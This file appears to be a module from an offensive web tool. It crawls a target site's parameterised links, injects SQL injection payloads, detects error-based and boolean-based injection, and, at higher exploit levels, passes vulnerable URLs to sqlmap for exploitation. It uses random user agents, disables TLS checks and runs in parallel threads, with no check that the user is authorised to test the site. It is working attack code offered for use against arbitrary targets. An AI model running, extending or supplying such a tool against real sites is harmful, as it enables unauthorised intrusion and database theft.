#!/usr/bin/env python3
import random
import threading
import time
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

import requests
from bs4 import BeautifulSoup

from config.var import var


def _same_domain(url, target_host):
    """Cek apakah URL berada di domain target atau subdomainnya."""
    try:
        host = urlparse(url).netloc.lower()
        target_host = target_host.lower()
        return host == target_host or host.endswith("." + target_host)
    except Exception:
        return False


def _has_query(url):
    """Cek apakah URL punya query parameter."""
    return bool(urlparse(url).query)


def _inject_payload(url, payload):
    """
    Inject payload ke nilai parameter pertama.
    Jika tidak ada query, return None (skip — bukan POC valid).
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return None
    first_key = next(iter(qs))
    qs[first_key] = [payload]
    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))


def _detect_sqli(response_text, baseline_text, payload,
                 response_status=None, baseline_status=None):
    """
    Deteksi SQLi — sangat ketat untuk menghindari false positive.

    Aturan:
    1. Error-based: pattern SQL error muncul di response (paling andal)
    2. Boolean-based: HANYA jika:
       - status code sama (200 vs 200)
       - body tidak kosong (len > 200)
       - perbedaan panjang > 200 karakter
       - konten response BERBEDA secara signifikan (bukan hanya panjang)
    """
    # --- 1. Error-based (paling andal) ---
    error_patterns = [
        var.mysqli1, var.accesqli1, var.mssqli1, var.oracle,
        "SQL syntax", "mysql_fetch", "Warning: mysql",
        "Unclosed quotation mark", "quoted string not properly terminated",
        "ORA-01756", "PostgreSQL.*ERROR", "SQLite/JDBCDriver",
    ]
    for pattern in error_patterns:
        if pattern and pattern.lower() in response_text.lower():
            return "error-based"

    # --- 2. Boolean-based (sangat ketat) ---
    # Hanya jika status code sama
    if response_status is not None and baseline_status is not None:
        if response_status != baseline_status:
            return None

    # Body harus tidak kosong dan cukup panjang
    if not response_text or not baseline_text:
        return None
    if len(response_text) < 200 or len(baseline_text) < 200:
        return None

    # Hanya untuk payload boolean yang jelas
    if payload not in ("1' AND '1'='2", "1 AND 1=2", "' AND '1'='2"):
        return None

    # Perbedaan panjang harus signifikan (> 200 karakter)
    len_diff = abs(len(response_text) - len(baseline_text))
    if len_diff <= 200:
        return None

    # Konten harus berbeda secara signifikan (bukan hanya panjang)
    # Bandingkan 500 karakter pertama — jika sama, bukan boolean-based
    prefix_len = min(500, len(response_text), len(baseline_text))
    if response_text[:prefix_len] == baseline_text[:prefix_len]:
        return None

    return "boolean-based"


def scan_subpages(target, proxy=None, verbose=False, session=None):
    """
    Scan subpages untuk SQLi — POC valid:
    - Hanya domain target & subdomain
    - Hanya URL dengan parameter
    - Inject payload ke nilai parameter
    - Deteksi error-based + boolean-based
    """
    log_file = var.log
    subpage_file = var.subpage_file
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Pastikan target punya scheme
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"

    target_host = urlparse(target).netloc
    print(f"[+] Subscan target host: {target_host}")

    # --- 1. Ambil halaman utama & ekstrak link ---
    headers = {"User-Agent": random.choice(var.ouruseragent)}
    requester = session if session is not None else requests
    try:
        response = requester.get(
            target, proxies=proxies, headers=headers,
            timeout=10, verify=False
        )
    except requests.RequestException as e:
        print(f"[!] Error connecting to {target}: {e}")
        return

    soup = BeautifulSoup(response.text, "html.parser")
    raw_links = []
    for a in soup.find_all("a", href=True):
        href = a.get("href")
        if not href:
            continue
        full = urljoin(target, href)
        if not full.startswith(("http://", "https://")):
            continue
        if "#" in full or "javascript" in full.lower():
            continue
        raw_links.append(full)

    # Deduplikasi
    raw_links = list(dict.fromkeys(raw_links))

    # Filter: hanya domain target & subdomain
    same_domain_links = [u for u in raw_links if _same_domain(u, target_host)]
    external_count = len(raw_links) - len(same_domain_links)

    print(f"[+] Found {len(raw_links)} hyperlinks "
          f"({len(same_domain_links)} same-domain, {external_count} external skipped)")

    # Filter: hanya yang punya parameter (POC valid)
    param_links = [u for u in same_domain_links if _has_query(u)]
    no_param_count = len(same_domain_links) - len(param_links)

    # FIX: sertakan target itu sendiri jika punya parameter
    if _has_query(target) and target not in param_links:
        param_links.insert(0, target)
        print(f"[+] Target sendiri punya parameter — ditambahkan ke uji: {target}")

    # FIX: sertakan target itu sendiri jika punya parameter
    if _has_query(target) and target not in param_links:
        param_links.insert(0, target)
        print(f"[+] Target sendiri punya parameter — ditambahkan ke uji: {target}")

    print(f"[+] {len(param_links)} URL dengan parameter akan diuji "
          f"({no_param_count} tanpa parameter di-skip)")

    with open(log_file, "a") as filelog:
        filelog.write(
            f"\n[+] Subscan {target}: "
            f"{len(param_links)} param URLs, {no_param_count} skipped (no param), "
            f"{external_count} external skipped\n"
        )

    if not param_links:
        print("[!] Tidak ada URL ber-parameter — subscan selesai (POC tidak bisa diuji)")
        return

    # --- 2. Scan paralel ---
    queue = Queue()
    threads = []
    scanned = set()
    scanned_lock = threading.Lock()

    def worker():
        while True:
            try:
                url = queue.get(timeout=1)
            except Empty:
                break

            try:
                with scanned_lock:
                    if url in scanned:
                        continue
                    scanned.add(url)

                # Rate limit
                delay = getattr(var, "delay", 0.0)
                if delay > 0:
                    time.sleep(delay)

                # Baseline (URL asli, tanpa payload)
                req_headers = {"User-Agent": random.choice(var.ouruseragent)}
                try:
                    baseline = requester.get(
                        url, proxies=proxies, headers=req_headers,
                        timeout=10, verify=False, allow_redirects=False
                    )
                except requests.RequestException as e:
                    if verbose:
                        print(f"[-] Skip (baseline error): {url}")
                    continue

                # Uji beberapa payload
                payloads = ["'", "1' AND '1'='2", "1 AND 1=2"]
                found = None
                for payload in payloads:
                    test_url = _inject_payload(url, payload)
                    if not test_url:
                        continue
                    if verbose:
                        print(f"[-] Testing SQLi: {test_url}")
                    try:
                        r = requester.get(
                            test_url, proxies=proxies, headers=req_headers,
                            timeout=10, verify=False, allow_redirects=False
                        )
                        technique = _detect_sqli(
                            r.text, baseline.text, payload,
                            response_status=r.status_code,
                            baseline_status=baseline.status_code
                        )
                        if technique:
                            found = (test_url, technique)
                            break
                    except requests.RequestException:
                        continue

                if found:
                    test_url, technique = found
                    print(f"[!] W00t !!! SQLi ({technique}) at: {test_url}")
                    with open(log_file, "a") as filelog:
                        filelog.write(
                            f"\n[!] SQLi ({technique}) at: {test_url}\n"
                        )
                    with open(subpage_file, "a") as f:
                        f.write(f"{test_url}\n")

                    # Integrasi sqlmap jika --exploit != detect
                    exploit_level = getattr(var, "exploit_level", "detect")
                    if exploit_level != "detect":
                        from modules.devilzc0de import run_sqlmap
                        import os as _os
                        output_dir = _os.path.join(
                            _os.path.dirname(var.log), "sqlmap_output"
                        )
                        run_sqlmap(
                            url, exploit_level=exploit_level,
                            output_dir=output_dir, session=session
                        )
                elif verbose:
                    print(f"[-] No SQLi at: {url}")

            finally:
                queue.task_done()

    for link in param_links[:100]:  # limit 100 URL
        queue.put(link)

    thread_count = min(10, len(param_links))
    for _ in range(thread_count):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"[+] Subpage scan finished for {target}")
